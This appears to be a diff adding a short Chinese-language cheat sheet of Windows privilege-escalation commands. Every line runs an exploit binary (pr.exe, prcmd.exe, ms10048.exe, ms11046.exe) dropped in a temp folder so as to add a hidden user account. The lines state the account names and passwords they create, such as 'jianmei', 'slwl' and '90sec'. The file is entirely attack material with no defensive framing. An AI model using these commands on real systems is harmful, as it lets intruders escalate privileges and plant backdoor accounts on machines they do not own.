@@ -1,0 +1,10 @@
+c:\windows\temp\cookies\123pr.exe "net user jianmei daxia.asd /add"
+
+c:\windows\temp\cookies\prcmd.exe "c:\windows\temp\cookies\1cmd.txt" "net user jianmei daxia.asd /add"
+
+c:\windows\temp\cookies\ms10048.exe net user jianmei daxia.asd /add或c:\windows\temp\cookies\ms10048.exe 1.exe
+
+c:\windows\temp\cookies\slwl.txt（执行就增加帐号：slwl 密码：slwl123）
+
+c:\windows\temp\cookies\ms11046.exe（执行就增加帐号：90sec 密码：90sec）
+
